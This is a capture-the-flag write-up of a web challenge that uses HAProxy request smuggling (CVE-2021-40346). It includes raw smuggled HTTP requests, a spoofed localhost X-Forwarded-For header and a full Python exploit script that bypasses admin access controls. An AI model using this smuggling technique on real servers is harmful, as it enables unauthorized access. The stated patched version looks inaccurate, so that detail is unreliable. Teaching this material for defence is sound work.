# Double Trouble (Web Exploitation)

## Challenge Description

> Double the Trouble, Twice the Fun

**Author:** kafka  
**URL:** `https://double.chals.nitectf25.live/`

## TL;DR

HTTP Request Smuggling via **HAProxy CVE-2021-40346** (integer overflow in header name length parsing). The attack poisons a session via `/con`, then smuggles a `GET /admin` request with `X-Forwarded-For: 127.0.0.1` past the proxy chain, with a precisely calculated `X-Offset` value derived from injected proxy headers.

## Architecture

The challenge provides `httpd.conf` and `app.py`, documenting a 4-layer stack:

```
Client → HAProxy 2.0.14 → Apache → Flask/Gunicorn
```

## Initial Analysis

### Step 1: Reconnaissance via `/api/v1/debug`

The debug endpoint reflects all headers arriving at Flask:

```bash
curl https://double.chals.nitectf25.live/api/v1/debug
```

Response reveals the injected headers from each proxy layer:

```
X-Haproxy-Version: 2.0.14
X-Proxy-Instance: frontend-01
X-Apache-Layer: reverse-proxy
X-Backend-Route: layer3
```

### Step 2: Spot the Misconfiguration in `httpd.conf`

Apache injects three headers but leaves `X-Offset` with no value:

```apache
RequestHeader set X-Apache-Layer "reverse-proxy"
RequestHeader set X-Backend-Route "layer3"
RequestHeader set X-Offset
```

This missing value is intentional — it's the offset we need to calculate for the smuggling attack.

### Step 3: Identify the CVE

HAProxy **2.0.14** is vulnerable to **CVE-2021-40346** — an integer overflow in header name length parsing. By sending a header name padded to exactly 255 characters (e.g. `Content-Length` + 241 `a`s), HAProxy reads the true `Content-Length` value that follows while the backend sees two separate `Content-Length` headers, causing desync.

## Solution

### Step 1: Poison the Session

Send a `GET /con` request with `Content-Length` pointing to a smuggled `GET /` body. This marks the session as `poisoned`:

```http
GET /con HTTP/1.1
Host: TARGET
Content-Length: 47
Connection: keep-alive

GET / HTTP/1.1
Host: TARGET

```

Flask's `/con` handler sets `poisoned = True` when `Content-Length > 0`:

```python
if int(content_length) > 0:
    player_sessions[user_id][token]['poisoned'] = True
```

Save the `session_token` and `user_id` cookies from this response.

### Step 2: Calculate X-Offset

The application validates the smuggled request using the sum of all proxy-injected header line lengths (including `\r\n`):

| Header line                         | Length  |
| ----------------------------------- | ------- |
| `X-Haproxy-Version: 2.0.14\r\n`     | 27      |
| `X-Proxy-Instance: frontend-01\r\n` | 31      |
| `X-Apache-Layer: reverse-proxy\r\n` | 31      |
| `X-Backend-Route: layer3\r\n`       | 25      |
| **Total**                           | **114** |

`X-Offset: 114` (anything in the ±5 range 110–120 also works).

### Step 3: Smuggle the Admin Request

Send a `POST /api/v1/data` with the padded `Content-Length` header name (CVE-2021-40346) and embed `GET /admin` with `X-Forwarded-For: 127.0.0.1` as the body:

```http
POST /api/v1/data HTTP/1.1
Host: TARGET
Cookie: session_token=TOKEN; user_id=UID
Content-Lengthaaaaaaaaaaaaaaa[...255 total chars...]:
Content-Length: 114
Connection: keep-alive

GET /admin HTTP/1.1
Host: TARGET
X-Forwarded-For: 127.0.0.1
X-Offset: 114
Cookie: session_token=TOKEN; user_id=UID

```

HAProxy's integer overflow causes it to read the second `Content-Length: 114` as the body length, while the backend treats the 114-byte embedded `GET /admin` request as a new pipelined request — with the injected localhost IP.

### Automated Solve Script

```python
import socket, time, json

TARGET_HOST = "double.chals.nitectf25.live"
TARGET_PORT = 443  # adjust for actual port

sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=30.0)

# Step 1: Poison session
dummy_body = f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\n\r\n".encode()
request1 = (
    f"GET /con HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}\r\n"
    f"Content-Length: {len(dummy_body)}\r\n"
    f"Connection: keep-alive\r\n\r\n"
).encode() + dummy_body
sock.sendall(request1)

time.sleep(0.5)
response1 = b""
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk or b"Reserved" in response1: break
        response1 += chunk
    except socket.timeout: break

# Parse cookies
cookies = {}
for line in response1.decode("utf-8", errors="ignore").split('\r\n'):
    if line.lower().startswith('set-cookie:'):
        part = line.split(':', 1)[1].strip()
        if '=' in part:
            k, v = part.split('=', 1)
            cookies[k] = v.split(';')[0]

session_token = cookies.get("session_token")
user_id = cookies.get("user_id")

# Step 2: Smuggle GET /admin
smuggled = (
    f"GET /admin HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}\r\n"
    f"X-Forwarded-For: 127.0.0.1\r\n"
    f"X-Offset: 114\r\n"
    f"Cookie: session_token={session_token}; user_id={user_id}\r\n\r\n"
).encode()

padding = "a" * 241  # pad "Content-Length" to 255 chars total
exploit_request = (
    f"POST /api/v1/data HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}\r\n"
    f"Cookie: session_token={session_token}; user_id={user_id}\r\n"
    f"Content-Length{padding}: \r\n"
    f"Content-Length: {len(smuggled)}\r\n"
    f"Connection: keep-alive\r\n\r\n"
).encode() + smuggled

sock.sendall(exploit_request)
time.sleep(2)

all_data = b""
for _ in range(15):
    try:
        sock.settimeout(1.0)
        chunk = sock.recv(8192)
        if not chunk: break
        all_data += chunk
    except socket.timeout: break

sock.close()
print(all_data.decode("utf-8", errors="ignore"))
```

## Flag

```
nite{h11p_1_1_must_d1e}
```

## Key Takeaways

- **CVE-2021-40346** — HAProxy integer overflow on header name length: a 255-char header name causes the parser to misread the following `Content-Length` value, enabling CL.CL desync
- **Request smuggling fundamentals** — two servers in a chain disagreeing on where one HTTP message ends allows injecting a prefix into the next request
- **X-Offset as desync simulation** — the challenge explicitly models the byte-offset corruption that happens in real smuggling attacks, making the math visible
- **Proxy header leakage** — debug endpoints that reflect injected proxy headers give attackers the exact values needed to compute exploit offsets
- **Defense:** Keep HAProxy updated past 2.0.17; reject ambiguous `Content-Length` headers at every layer; disable debug reflection endpoints in production

## Tools Used

- `curl` — initial recon of the `/api/v1/debug` endpoint
- Python `socket` — raw TCP connection for crafting smuggled HTTP requests
- Wireshark — verifying the exact byte layout of the exploit request
